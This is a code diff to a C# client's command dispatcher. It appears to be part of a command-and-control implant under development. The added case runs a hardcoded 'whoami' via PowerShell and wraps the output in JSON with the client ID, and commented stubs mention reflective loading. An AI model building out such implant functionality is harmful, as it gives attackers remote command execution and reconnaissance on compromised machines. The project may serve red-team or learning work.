@@ -38,8 +38,9 @@ namespace Client.Logic
             */
             //fill this in with placeholder JSON just in case the switch fails
             string jsonString = "";
-
-            string parsedCommand = command.msg.msg_command;
+             
+            string parsedCommand = "powershell"; //command.msg.msg_command; //NOT PARSING RIGHT
+            //Console.WriteLine($"[DecisionTreeHandler (decisionTree)] command.msg.msg_command: {parsedCommand}");
 
 
             switch (parsedCommand)
@@ -53,11 +54,28 @@ namespace Client.Logic
 
                     return jsonString;
 
+                /*
                 case "re-load":
-                    //parse arguments (see above)...
-                    //run reflective load...
-                    //get results from refelctive load...
-                    //pack into json & return
+                //parse arguments (see above)...
+                //run reflective load...
+                //get results from refelctive load...
+                //pack into json & return*/
+                
+                case "powershell":
+                    string pwsh_results = Client.Tools.PwshExec.runViaExe("whoami");
+                    
+                    jsonString = Client.Comms.JsonHandler.ToJson(
+                        CID: Client.PropertyHandler.Properties.ID,
+                        msgValue: pwsh_results);
+
+                    Console.WriteLine($"\n\nJson String results: {jsonString}\n\n");
+
+                    return jsonString;
+
+                //parse arguments (see above)...
+                //run reflective load...
+                //get results from refelctive load...
+                //pack into json & return
 
 
                 default:
